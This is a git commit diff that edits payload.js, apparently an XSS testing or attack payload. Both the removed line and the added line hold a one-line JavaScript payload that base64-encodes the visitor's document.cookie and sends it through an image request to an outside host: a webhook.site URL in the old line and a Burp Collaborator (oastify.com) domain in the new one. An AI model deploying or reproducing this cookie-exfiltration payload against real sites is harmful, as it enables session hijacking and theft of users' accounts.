060404bdf5f3222695791f52e4cd916a1cabca99
Chinh Do <89497629+Chid0k@users.noreply.github.com>
2025-08-03 18:19:29 +0700

    payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
- x = new Image(); x.src = 'https://webhook.site/d81f39b8-ab0d-4f78-b5a2-591415dd5155?data='+btoa(document.cookie);
+ x = new Image(); x.src = 'http://0cdkfmpjjgl44p2dbd8w33qeq5wwkm8b.oastify.com?data='+btoa(document.cookie);
